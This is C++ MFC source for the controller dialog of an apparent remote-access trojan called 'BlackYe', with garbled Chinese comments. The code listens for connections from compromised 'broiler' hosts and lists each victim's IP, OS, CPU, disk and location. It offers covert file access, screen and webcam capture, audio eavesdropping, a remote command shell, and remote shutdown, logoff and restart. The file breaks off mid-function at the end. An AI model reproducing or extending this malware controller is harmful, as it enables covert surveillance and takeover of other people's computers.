
// ClientDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDlg.h"
#include "BroilerData.h"
#include "MsgNoticeWnd.h"

#include <mmsystem.h>
#pragma comment(lib, "WINMM.LIB")

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct
{
	TCHAR *title;
	int nWidth; 
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{_T("WAN"),				102	},
	{_T("LAN"),				102	},
	{_T("�������/��ע"),	107	},
	{_T("����ϵͳ"),		 70	},
	{_T("CPU"),				 70	},
	{_T("Ӳ��"),			 51	},
	{_T("����λ��"),	    117	}
};

int g_Column_Width = 0;   //�ܿ��
static int g_Column_Count = sizeof(g_Column_Data) / sizeof(COLUMNSTRUCT) ;   //list�ؼ��б���Ŀ

static UINT idArray[] = {ID_RES_COPYRIGHT,     //״̬��
                            ID_RES_LISTENPORT,
							ID_RES_ONLINE};


// CClientDlg �Ի���
CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
: CDialog(CClientDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_bNotify = false;
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER, m_listCtrl);
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_MESSAGE(WM_SHOWTASK,OnShowTask)
	ON_MESSAGE(ID_MSG_ONLINE, OnAddHost)
	ON_MESSAGE(ID_MSG_OFFLINE, OnOffLine)
	ON_COMMAND(ID_FILE_MANAGER, OnFileManager)
	ON_COMMAND(ID_SYS_MANAGER, OnSysManager)
	ON_COMMAND(ID_CMDSHELL_MANAGER, OnCmdShellManager)
	ON_COMMAND(ID_SCREEN_MANAGER, OnScreenManager)
	ON_COMMAND(ID_VIDEO_MANAGER, OnVideoManager)
	//}}AFX_MSG_MAP
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER, &CClientDlg::OnNMRClickListServer)
	ON_COMMAND(ID_MENU_MSG, &CClientDlg::OnMenuMsg)
	ON_COMMAND(ID_MENU_SHUTDOWN, &CClientDlg::OnMenuShutdown)
	ON_COMMAND(ID_MENU_RESET, &CClientDlg::OnMenuReset)
	ON_COMMAND(ID_MENU_LOGOFF, &CClientDlg::OnMenuLogoff)
	ON_COMMAND(ID_MENU_VOICE, &CClientDlg::OnMenuVoice)
	ON_COMMAND(ID_MENU_REMOTE_CMD, &CClientDlg::OnMenuRemoteCmd)
	ON_COMMAND(ID_MENU_DESKTOP, &CClientDlg::OnMenuDesktop)
	ON_WM_DESTROY()
	ON_WM_SYSCOMMAND()
	ON_COMMAND(ID_MENU_TRAY_HIDE, &CClientDlg::OnMenuTrayHide)
	ON_COMMAND(ID_MENU_TRAY_SHOW, &CClientDlg::OnMenuTrayShow)
	ON_COMMAND(ID_MENU_TRAY_EXIT, &CClientDlg::OnMenuTrayExit)
END_MESSAGE_MAP()


// CClientDlg ��Ϣ�������

BOOL CClientDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	m_pMsgWindow = NULL;

	this->m_maxConn = m_cfg.GetMaxConn();
	this->m_nPort = m_cfg.GetPort();
	this->m_bSound = (m_cfg.GetSound() == 1 ? true : false);
	UpdateMain(m_nPort);
    
	InitTray();  //��ʼ������
	//�Ҽ��˵�ͼ��
	m_MenuBmp[0].LoadBitmap(IDB_BMP_MAIL);
	m_MenuBmp[1].LoadBitmap(IDB_BMP_SHUTDOWN);
	m_MenuBmp[2].LoadBitmap(IDB_BMP_RESTART);
	m_MenuBmp[3].LoadBitmap(IDB_BMP_LOGOFF);
	m_MenuBmp[4].LoadBitmap(IDB_BMP_AUDIO);
	m_MenuBmp[5].LoadBitmap(IDB_BMP_REMOTE);
	m_MenuBmp[6].LoadBitmap(IDB_BMP_DESKTOP);

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

void CClientDlg::InitTray()
{
	m_nid.cbSize=(DWORD)sizeof(NOTIFYICONDATA);
	m_nid.hWnd=this->m_hWnd;
	m_nid.uID=IDR_MAINFRAME;
	m_nid.uFlags=NIF_ICON|NIF_MESSAGE|NIF_TIP ;
	m_nid.uCallbackMessage=WM_SHOWTASK;//�Զ������Ϣ����
	m_nid.hIcon=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME));
	CString strExeName = _T("BlackYe.Զ��1.0 Beat");
	wsprintfW(m_nid.szTip, _T("%s"), strExeName);
	Shell_NotifyIcon(NIM_ADD,&m_nid);//�����������ͼ��  
}


LRESULT CClientDlg::OnShowTask( WPARAM wParam,LPARAM lParam )
{
	//wParam���յ���ͼ���ID����lParam���յ���������Ϊ

	if (IDR_MAINFRAME != wParam)
	{
		return 1;
	}
	switch (lParam)
	{
	case WM_RBUTTONUP:			//�Ҽ�����ʱ������ݲ˵�
		{
			CMenu trayMenu;   //����Ŀ¼
			trayMenu.LoadMenu(IDR_MENU_TRAY);
			CMenu *pSubMenu = trayMenu.GetSubMenu(0);
			CBitmap bmp[3];
			bmp[0].LoadBitmap(IDB_BMP_HIDE);
			bmp[1].LoadBitmap(IDB_BMP_SHOW);
			bmp[2].LoadBitmap(IDB_BMP_EXIT);
			//����ͼ��
			pSubMenu->SetMenuItemBitmaps(ID_MENU_TRAY_HIDE, MF_BYCOMMAND, &bmp[0], &bmp[0]);
			pSubMenu->SetMenuItemBitmaps(ID_MENU_TRAY_SHOW, MF_BYCOMMAND, &bmp[1], &bmp[1]);
			pSubMenu->SetMenuItemBitmaps(ID_MENU_TRAY_EXIT, MF_BYCOMMAND, &bmp[2], &bmp[2]);
			CPoint point;
			GetCursorPos(&point);  //��ȡ���λ��
			SetForegroundWindow();  //����ǰ������,����˵�����ʧ������
			pSubMenu->TrackPopupMenu(TPM_LEFTALIGN |TPM_RIGHTBUTTON, point.x, point.y, this);		
			trayMenu.Detach();   //��Դ����
			trayMenu.DestroyMenu();
		}
		break;
	case WM_LBUTTONDBLCLK:    //˫������Ĵ���
		{
			this->ShowWindow(SW_SHOW);    //�򵥵���ʾ���������¶�
		}
		break;
	}
	return 0;
}

void CClientDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	if (SIZE_MINIMIZED == nType)  //��С��
	{
		return ;
	}
	CListCtrl* pListCtrl = (CListCtrl*)GetDlgItem(IDC_LIST_SERVER);  //��ȡ�ؼ��Ĳ������
	if (NULL !=pListCtrl)
	{
		CRect rect, rect_Now;
		GetClientRect(&rect_Now);
		pListCtrl->GetWindowRect(&rect);
		ScreenToClient(&rect);
		rect.right = cx;
		rect.bottom = rect.bottom + (rect_Now.bottom - m_rect.bottom);
		pListCtrl->MoveWindow(rect);
		//List�ؼ����д�С�Զ�����
		int nScrollWidth = GetSystemMetrics(SM_CXVSCROLL) + 1;
		int nWidth = rect_Now.Width() - nScrollWidth - 2;
		pListCtrl->SetColumnWidth(0, static_cast<int>(nWidth * 0.18));
		pListCtrl->SetColumnWidth(1, static_cast<int>(nWidth * 0.18));
		pListCtrl->SetColumnWidth(2, static_cast<int>(nWidth * 0.20));
		pListCtrl->SetColumnWidth(3, static_cast<int>(nWidth * 0.12));
		pListCtrl->SetColumnWidth(4, static_cast<int>(nWidth * 0.10));
		pListCtrl->SetColumnWidth(5, static_cast<int>(nWidth * 0.10));
		pListCtrl->SetColumnWidth(6, static_cast<int>(nWidth * 0.15));

		RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //��ʾ��������״̬������仰һ��Ҫ����, ���򹤾�������ʾ��
	}
	if (m_statusBarCtrl.GetSafeHwnd())  //�ػ�״̬��
	{
		//CRect rect;
		//m_statusBarCtrl.GetItemRect(0, &rect);
		//GetClientRect(&rect);
		//int nChange = rect.right - m_rect.right;
		//m_statusBarCtrl.SetPaneInfo(0, idArrayBar[0], SBPS_NORMAL, 280 + nChange * 0.42);
		//m_statusBarCtrl.SetPaneInfo(1, idArrayBar[1], SBPS_NORMAL, 180 + nChange * 0.20);
		//m_statusBarCtrl.SetPaneInfo(2, idArrayBar[2], SBPS_NORMAL, 200 + nChange * 0.38);
	}
	GetClientRect(&m_rect);
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

BOOL CClientDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	
    if((nID & 0xFFF0) == SC_MINIMIZE)  //��С��
	{
		ShowTrayTask();     //��������   
	}
	else 
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

void CClientDlg::ShowTrayTask()
{
	if (!m_bNotify)
	{
		Shell_NotifyIcon(NIM_DELETE, &m_nid);  //ɾ������ʱ������ͼ��
		m_nid.cbSize = (DWORD)sizeof(NOTIFYICONDATA) - sizeof(HICON);   //xp����Ҫ����sizeof(HICON)����
		m_nid.hWnd = this->m_hWnd;
		m_nid.uID = IDR_MAINFRAME;
		m_nid.uFlags = NIF_ICON|NIF_MESSAGE|NIF_TIP|NIF_INFO;
		m_nid.uCallbackMessage = WM_SHOWTASK;//�Զ������Ϣ����,ע��:�������Ϣ���û��Զ�����Ϣ
		m_nid.hIcon = LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME));
		wcscpy_s(m_nid.szTip,_T("BlackYe.Զ��1.0 Beat"));//��Ϣ��ʾ��Ϊ"�ƻ���������"
		wcscpy_s(m_nid.szInfo,_T("Running ........"));
		wcscpy_s(m_nid.szInfoTitle,_T("BlackYe.Զ��1.0 Beat"));
		m_nid.dwInfoFlags = NIIF_INFO;
		m_nid.uTimeout = 5000;		
		Shell_NotifyIcon(NIM_ADD, &m_nid);//�����������ͼ��
	}
// 	AnimateWindow(1000,AW_HIDE|AW_BLEND);      //������ʧ����
	ShowWindow(SW_HIDE);//����������
}

void CClientDlg::UpdateMain(IN const UINT nPort)
{
	m_ImageList.Create(32, 32, ILC_COLOR24|ILC_MASK, 1, 1);
	CBitmap toolBarBmp[8];  //����ͼƬ��Դ
	toolBarBmp[0].LoadBitmap(IDB_BMP_FILE);
	toolBarBmp[1].LoadBitmap(IDB_BMP_SCREEN);
	toolBarBmp[2].LoadBitmap(IDB_BMP_CMD);
	toolBarBmp[3].LoadBitmap(IDB_BMP_PROCESS);
	toolBarBmp[4].LoadBitmap(IDB_BMP_CAMERA);
	toolBarBmp[5].LoadBitmap(IDB_BMP_RECYCLE);
	toolBarBmp[6].LoadBitmap(IDB_BMP_SETTING);
	toolBarBmp[7].LoadBitmap(IDB_BMP_ABOUT);
	for (int nIndex = 0; nIndex < 8; nIndex++)
	{
		m_ImageList.Add(&toolBarBmp[nIndex], RGB(255, 255, 255));  //���õ�ͼ���б���
	}

	const UINT idArray[9] = {ID_RES_FILE, ID_RES_SCREEN, ID_RES_CMD, ID_RES_SYSTEM, ID_RES_CAMERA, ID_RES_RECYCLE, ID_RES_SEPARATE, ID_RES_SEETING, ID_RES_ABOUT};
	m_toolBarCtrl.CreateEx(this);
	m_toolBarCtrl.SetButtons(idArray, sizeof(idArray) / sizeof(UINT));
	m_toolBarCtrl.SetSizes(CSize(60, 56), CSize(24, 24));
	m_toolBarCtrl.SetButtonText(0,_T("�ļ�����"));
	m_toolBarCtrl.SetButtonText(1,_T("��Ļ���"));
	m_toolBarCtrl.SetButtonText(2,_T("�����ն�"));
	m_toolBarCtrl.SetButtonText(3,_T("ϵͳ����"));
	m_toolBarCtrl.SetButtonText(4,_T("��Ƶ���"));
	m_toolBarCtrl.SetButtonText(5,_T("ж������"));
	m_toolBarCtrl.SetButtonText(7,_T("��������"));
	m_toolBarCtrl.SetButtonText(8,_T("�������"));
	m_toolBarCtrl.GetToolBarCtrl().SetImageList(&m_ImageList);

	m_statusBarCtrl.Create(this);  //״̬���Ĵ���
	m_statusBarCtrl.SetIndicators(idArray, sizeof(idArray) / sizeof(UINT));
	m_statusBarCtrl.SetPaneInfo(0, idArray[0], SBPS_NORMAL, 280);
	m_statusBarCtrl.SetPaneInfo(1, idArray[1], SBPS_NORMAL, 180);
	m_statusBarCtrl.SetPaneInfo(2, idArray[2], SBPS_NORMAL, 200);
	CTime startTime = CTime::GetCurrentTime();
	CString strRunTime = startTime.Format("%Y-%m-%d %X");  //����ʱ��
	CString strTime = _T("[����ʱ��: ");
	strTime += strRunTime;
	strTime += _T("]");
	CString strListenPort = _T("");   //�����˿�
	strListenPort.Format(_T("��ǰ�����˿�: %d"), nPort);
	m_statusBarCtrl.SetPaneText(0, strTime);
	m_statusBarCtrl.SetPaneText(1, strListenPort);
	m_statusBarCtrl.SetPaneText(2, _T("��������: 0 ̨"));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //��ʾ��������״̬������仰һ��Ҫ����, ���򹤾�������ʾ��
    
	m_ImageHostList.Create(16, 16, ILC_COLOR24|ILC_MASK, 1, 1);
	m_ImageHostList.Add(AfxGetApp()->LoadIcon(IDI_ICON_CAMER));
	m_ImageHostList.Add(AfxGetApp()->LoadIcon(IDI_ICON_NOCAMER));
	for (int Index = 0 ; Index < g_Column_Count ; Index++)  //������
	{
		m_listCtrl.InsertColumn(Index, g_Column_Data[Index].title);
		m_listCtrl.SetColumnWidth(Index, g_Column_Data[Index].nWidth);
		g_Column_Width += g_Column_Data[Index].nWidth;
	}
	m_listCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);
	m_listCtrl.SetImageList(&m_ImageHostList, LVSIL_SMALL);
	GetClientRect(&m_rect);  //�õ��ͻ�����

	HANDLE hThread = CreateThread(NULL, 0, InitSocketProc, (LPVOID)this, 0, NULL);   //���������߳�
	if (NULL == hThread)
	{
		MessageBox(_T("���������߳�ʧ��!"), _T("����!"), MB_OK |MB_ICONERROR);
	}
	CloseHandle(hThread);
}


DWORD WINAPI CClientDlg::InitSocketProc( LPVOID lpParameter )
{
	CClientDlg* pThis = (CClientDlg*)lpParameter;
	if (NULL != pThis)
	{
		UINT32 result = ERROR_SUCCESS;
		bool bSuccess = true;
		result = pThis->InitSocket(&bSuccess);
		ASSERT(ERROR_SUCCESS == result);
		ASSERT(true == bSuccess);  //�ͻ���socket��ʼ���ɹ�
	}
	return 0;
}

UINT32 CClientDlg::InitSocket( OUT bool* pbSuccess )
{
	UINT32 result = ERROR_SUCCESS;
	if (NULL == pbSuccess)
	{
		result = ERROR_INVALID_PARAMETER;
		return result;
	}
	bool bSuccess = true;
	WSADATA wsadata;
	try
	{
		int err = WSAStartup(MAKEWORD(2, 2), &wsadata);
		if (err)  //��ʼ��
		{
			bSuccess = false;
			result = WSAGetLastError();
			throw result;
		}
		m_ListenSocket = socket(AF_INET, SOCK_STREAM, 0); //�½�Socket
		if (INVALID_SOCKET == m_ListenSocket)
		{
			bSuccess = false;
			result = WSAGetLastError();
			MessageBox(_T("�ͻ��˼����˿ڴ���ʧ��!"), _T("��ʾ!"), MB_OK | MB_ICONWARNING);
			throw result;
		}

		sockaddr_in serverAddr;
		serverAddr.sin_addr.S_un.S_addr = INADDR_ANY;
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(m_nPort);

		int nRet;
		nRet = bind(m_ListenSocket, (sockaddr*)&serverAddr, sizeof(sockaddr_in));  //�󶨶˿�
		if (SOCKET_ERROR == nRet)
		{
			bSuccess = false;
			result = WSAGetLastError();
			MessageBox(_T("�ͻ��˼����˿ڰ�ʧ��!"), _T("��ʾ!"), MB_OK | MB_ICONWARNING);
			throw result;
		}
		if (SOCKET_ERROR == listen(m_ListenSocket, SOMAXCONN))  //�˿ڼ���
		{
			bSuccess = false;
			result = WSAGetLastError();
			MessageBox(_T("�ͻ��˼����˿ڼ���ʧ��!"), _T("��ʾ!"), MB_OK | MB_ICONWARNING);
			throw result;
		}

		while (true)
		{
			SOCKET clientSocket;  //������ͨ��socket
			sockaddr_in clientAddr;
			int addLen = sizeof(sockaddr_in);
			clientSocket = accept(m_ListenSocket, (sockaddr*)&clientAddr, &addLen);
			if (INVALID_SOCKET == clientSocket)
			{
				continue;
			}
			AddHost(clientSocket, clientAddr);  //�������
		}
	}
	catch (UINT32)
	{
	}
	*pbSuccess = bSuccess;
	return result;
}

void CClientDlg::AddHost( SOCKET socket, sockaddr_in addr ) //�����������
{
	AddNewItemData(socket, addr);
}

void CClientDlg::AddNewItemData( SOCKET socket, sockaddr_in addr )
{
	UINT nId;
	int iCount = m_listCtrl.GetItemCount();
	CBroilerData* pBroilerData = NULL;
	if (0 == iCount)
	{
		nId = 0;
	}
	else
	{
		nId = 0;
		for (int index = 0; index < iCount; index++)
		{
			pBroilerData = (CBroilerData*)m_listCtrl.GetItemData(index);
			if (pBroilerData->getID() == nId)
			{
				index = 0;
				nId = nId + 1;
				continue;
			}
		}
	}
	pBroilerData = NULL;
	pBroilerData = new CBroilerData(nId, socket, &addr, this->m_hWnd);
	pBroilerData->OpenWorkThread();
}

LRESULT CClientDlg::OnAddHost( WPARAM wparam,LPARAM lparam )
{
	CBroilerData* pBroilerData = (CBroilerData*)wparam;
	int index = m_listCtrl.GetItemCount();

	if (pBroilerData->bCap())
	{
		m_listCtrl.InsertItem(index, pBroilerData->getWANIP(), 0);
	}
	else
	{
		m_listCtrl.InsertItem(index, pBroilerData->getWANIP(), 1);
	}
	m_listCtrl.SetItemText(index, 1, pBroilerData->getLocalIP());
	m_listCtrl.SetItemText(index, 2, pBroilerData->getRemark());
	m_listCtrl.SetItemText(index, 3, pBroilerData->getOSVersion());
	m_listCtrl.SetItemText(index, 4, pBroilerData->getCPU());
	m_listCtrl.SetItemText(index, 5, pBroilerData->getDiskSize());
	m_listCtrl.SetItemText(index, 6, pBroilerData->getAddress());
	m_listCtrl.SetItemData(index, (DWORD)pBroilerData);

	UpdateStatusBarInfo(); //����״̬����Ϣ
	CString strOnlineMsg = _T("��������:  ");
	strOnlineMsg += pBroilerData->getWANIP();
	ShowMsgNotice(MSG_CAPTION_ONLINE, strOnlineMsg);
	if (m_bSound)
	{
		PlaySound(_T("Sound\\Login.wav"), 0, SND_FILENAME | SND_ASYNC);
	}
	return 0;
}

LRESULT CClientDlg::OnOffLine( WPARAM wparam,LPARAM lparam )
{
	CBroilerData* pBroilerData = NULL;
	CString strOfflineMsg = _T("��������:  ");
	for (int nIndex = 0; nIndex < m_listCtrl.GetItemCount(); nIndex++)
	{
		pBroilerData = (CBroilerData*)m_listCtrl.GetItemData(nIndex);
		if (pBroilerData->getID() == (int)wparam)
		{
			strOfflineMsg += pBroilerData->getWANIP();
			::closesocket(pBroilerData->m_socket);
			delete pBroilerData;
			m_listCtrl.DeleteItem(nIndex);
		}
	}

	UpdateStatusBarInfo();  //����״̬����Ϣ
	ShowMsgNotice(MSG_CAPTION_OFFLINE, strOfflineMsg);

	if (m_bSound)
	{
		PlaySound(_T("Sound\\Offline.wav"), 0, SND_FILENAME | SND_ASYNC);
	}
	return 0;
}

void CClientDlg::ShowMsgNotice(IN CString strCaption, IN CString strOnlineMsg)
{
	m_pMsgWindow = new CMsgNoticeWnd(strCaption, strOnlineMsg);
	m_pMsgWindow->CreateMsgWindow();
	//����Ӧ�ó���������������
	DWORD Style = ::GetWindowLong(m_pMsgWindow->m_hWnd, GWL_EXSTYLE);   
	Style = WS_EX_TOOLWINDOW;   
	m_pMsgWindow->ShowWindow(FALSE);
	::SetWindowLong(m_pMsgWindow->m_hWnd, GWL_EXSTYLE, Style);  
	m_pMsgWindow->ShowWindow(TRUE);

	m_pMsgWindow->UpdateWindow();
}

void CClientDlg::UpdateStatusBarInfo()
{
	int iCount = m_listCtrl.GetItemCount();  //�õ�������������
	TCHAR* szText = NULL;
	CString strOnLine;
	strOnLine.Format(_T("��������: %d ̨"), iCount);
	szText = strOnLine.GetBuffer(0);
	::SendMessageW(m_statusBarCtrl, SB_SETTEXT, (WPARAM)2, (LPARAM)szText);
	strOnLine.ReleaseBuffer();
}

//////////////////////////////////////////////////////////////////////////

void CClientDlg::OnFileManager()
{
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToFileManager();
	}
}

void CClientDlg::OnScreenManager()
{
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToScreenManager();
	}
}

void CClientDlg::OnCmdShellManager()
{
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToCMDShellManager();
	}
}

void CClientDlg::OnSysManager()
{
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToSystemManager();
	}
}

void CClientDlg::OnVideoManager()
{
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RuntToVideoManager();
	}
}

CBroilerData* CClientDlg::GetSelfItemInfo()
{
	CBroilerData* pBroilerData = NULL;
	POSITION pos;
	pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL == pos)
	{
		return pBroilerData;
	}
	int nItem = m_listCtrl.GetNextSelectedItem(pos);
	pBroilerData = (CBroilerData*)m_listCtrl.GetItemData(nItem);
	return pBroilerData;
}


//////////////////////////////////////////////////////////////////////////
void CClientDlg::OnNMRClickListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	int nCount = m_listCtrl.GetItemCount();
	if (0 == nCount)
	{
		return ;
	}
	CMenu operaMenu;   //����Ŀ¼
	operaMenu.LoadMenu(IDR_MENU_HOST);
	CMenu *pSubMenu = operaMenu.GetSubMenu(0);
	pSubMenu->SetMenuItemBitmaps(ID_MENU_MSG, MF_BYCOMMAND, &m_MenuBmp[0], &m_MenuBmp[0]);
	pSubMenu->SetMenuItemBitmaps(ID_MENU_SHUTDOWN, MF_BYCOMMAND, &m_MenuBmp[1], &m_MenuBmp[1]);
	pSubMenu->SetMenuItemBitmaps(ID_MENU_RESET, MF_BYCOMMAND, &m_MenuBmp[2], &m_MenuBmp[2]);
	pSubMenu->SetMenuItemBitmaps(ID_MENU_LOGOFF, MF_BYCOMMAND, &m_MenuBmp[3], &m_MenuBmp[3]);
	pSubMenu->SetMenuItemBitmaps(ID_MENU_VOICE, MF_BYCOMMAND, &m_MenuBmp[4], &m_MenuBmp[4]);
	pSubMenu->SetMenuItemBitmaps(ID_MENU_REMOTE_CMD, MF_BYCOMMAND, &m_MenuBmp[5], &m_MenuBmp[5]);
	pSubMenu->SetMenuItemBitmaps(ID_MENU_DESKTOP, MF_BYCOMMAND, &m_MenuBmp[6], &m_MenuBmp[6]);

	int nItem = pNMItemActivate->iItem;  //ѡ���������ֵ
	if (-1 == nItem) //û��ѡ����
	{
		pSubMenu->EnableMenuItem(ID_MENU_MSG, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_MENU_SHUTDOWN, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_MENU_RESET, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_MENU_LOGOFF, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_MENU_VOICE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_MENU_REMOTE_CMD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_MENU_DESKTOP, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_MENU_SCANPORT, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}
	CPoint point;
	GetCursorPos(&point);  //��ȡ���λ��
	pSubMenu->TrackPopupMenu(TPM_LEFTALIGN, point.x, point.y, this);
	*pResult = 0;
}

void CClientDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (IDYES == ::MessageBox(this->GetSafeHwnd(), _T("��ȷ��Ҫ�˳�BlackYeԶ�̿��������?"), _T("�˳�����"), MB_YESNO | MB_ICONWARNING))
	{
		if (NULL != m_pMsgWindow)
		{
			delete[] m_pMsgWindow;
		}
		::closesocket(m_ListenSocket);
		::WSACleanup();
	}
	else
	{
		return;
	}
	CDialog::OnClose();
}

//////////////////////////////////////////////////////////////////////////
//�����Ҽ��˵��¼���Ӧ

//��ʹ����
void CClientDlg::OnMenuMsg()
{
	// TODO: �ڴ���������������
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToChatMsgManager();
	}
}

//�ػ�
void CClientDlg::OnMenuShutdown()
{
	// TODO: �ڴ���������������
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToOperatorManager(0);
	}
}

//ע��
void CClientDlg::OnMenuLogoff()
{
	// TODO: �ڴ���������������
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToOperatorManager(1);
	}
}

//����
void CClientDlg::OnMenuReset()
{
	// TODO: �ڴ���������������
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToOperatorManager(2);
	}
}

//���Լ���
void CClientDlg::OnMenuVoice()
{
	// TODO: �ڴ���������������
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToAudioManager();
	}
}

//Զ������㲥
void CClientDlg::OnMenuRemoteCmd()
{
	// TODO: �ڴ���������������
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToRemoteCmdManager();
	}
}

//�������
void CClientDlg::OnMenuDesktop()
{
	// TODO: �ڴ���������������
	CBroilerData* pBroilerData = NULL;
	bool bSuccess = true;
	pBroilerData = GetSelfItemInfo();
	if (NULL == pBroilerData)
	{
		return ;
	}
	else
	{
		pBroilerData->RunToDesktopManager();
	}
}

//�Ի�������
void CClientDlg::OnDestroy()
{
	Shell_NotifyIcon(NIM_DELETE , &m_nid);  //������Դ�ͷ�
	int nCount = m_listCtrl.GetItemCount();  //�ͷŴ����ListCtrl�е�����
	for (int index = 0; index < nCount ; index++)
	{
		CBroilerData* pBroilerData = (CBroilerData*)m_listCtrl.GetItemData(index);
		if (NULL != pBroilerData)
		{
			delete pBroilerData;
			pBroilerData = NULL;
		}
	}
	CDialog::OnDestroy();
}

void CClientDlg::OnMenuTrayHide()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_HIDE);
}

void CClientDlg::OnMenuTrayShow()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_SHOW);
}

void CClientDlg::OnMenuTrayExit()
{
